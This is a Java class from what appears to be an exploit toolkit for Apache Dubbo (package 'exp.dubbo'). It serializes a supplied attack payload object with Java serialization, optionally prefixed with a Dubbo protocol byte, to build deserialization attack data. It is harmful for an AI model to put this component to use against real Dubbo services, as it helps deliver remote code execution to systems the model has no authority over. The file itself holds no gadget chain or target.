package com.threedr3am.exp.dubbo.serialization.java;

import com.threedr3am.exp.dubbo.payload.Payload;
import com.threedr3am.exp.dubbo.serialization.Serialization;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import org.apache.dubbo.common.serialize.Constants;

/**
 * @author threedr3am
 */
public class JavaSerialization implements Serialization {

  private Payload payload;

  @Override
  public byte[] makeData(Payload payload, String[] args, String protocol) {
    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

    try {
      ObjectOutputStream out = new ObjectOutputStream(byteArrayOutputStream);
      if (protocol.equalsIgnoreCase("dubbo")) {
        out.writeByte(1);
      }
      out.writeObject(payload.getPayload(args));
      out.close();

      return byteArrayOutputStream.toByteArray();

    } catch (Exception e) {
      e.printStackTrace();
    }

    return new byte[0];
  }

  @Override
  public byte getType() {
    return Constants.JAVA_SERIALIZATION_ID;
  }

  @Override
  public void setPayload(Payload payload) {
    this.payload = payload;
  }

  @Override
  public Payload getPayload() {
    return this.payload;
  }
}
